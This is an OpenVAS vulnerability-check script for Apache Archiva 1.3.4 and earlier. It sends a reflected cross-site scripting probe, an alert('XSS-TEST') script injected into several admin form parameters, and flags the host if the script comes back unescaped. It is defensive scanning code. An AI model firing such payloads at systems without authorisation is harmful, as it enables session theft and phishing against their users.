##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_archiva_multiple_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Apache Archiva Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################################################################

CPE = "cpe:/a:apache:archiva";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801942");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-06-02 11:54:09 +0200 (Thu, 02 Jun 2011)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2011-1077", "CVE-2011-1026");
  script_name("Apache Archiva Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://archiva.apache.org/security.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101797/apachearchivapoc-xss.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_archiva_detect.nasl");
  script_mandatory_keys("apache_archiva/installed");
  script_require_ports("Services/www", 8080);
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject arbitrary
HTML codes, theft of cookie-based authentication credentials, arbitrary URL redirection, disclosure or
modification of sensitive data and phishing attacks.");
  script_tag(name:"affected", value:"Apache Archiva version 1.3.4 and prior.");
  script_tag(name:"insight", value:"Multiple flaws are due to insufficient input validation in the input
fields throughout the application. Successful exploitation could allow an attacker to compromise the
application.");
  script_tag(name:"solution", value:"Upgrade to Apache Archiva Version 1.3.5 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"This host is running Apache Archiva and is prone to multiple
vulnerabilities.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

req = http_get(item:string(dir,  "/admin/addLegacyArtifactPath!commit.action?" +
               "legacyArtifactPath.path=test<script>alert('XSS-TEST')<%2Fscri" +
               "pt>&groupId=test<script>alert('XSS-TEST')<%2Fscript>&artifact" +
               "Id=test<script>alert('XSS-TEST')<%2Fscript>&version=test<scri" +
               "pt>alert('XSS-TEST')<%2Fscript>&classifier=test<script>alert"  +
               "('XSS-TEST')<%2Fscript>&type=test<script>alert('XSS-TEST')<%"  +
               "2Fscript>"), port:port);

rcvRes = http_keepalive_send_recv(port:port, data:req);

if(rcvRes =~ "HTTP/1\.. 200" && "test<script>alert('XSS-TEST')</script>/test" >< rcvRes){
  security_message(port);
  exit(0);
}

exit(0);
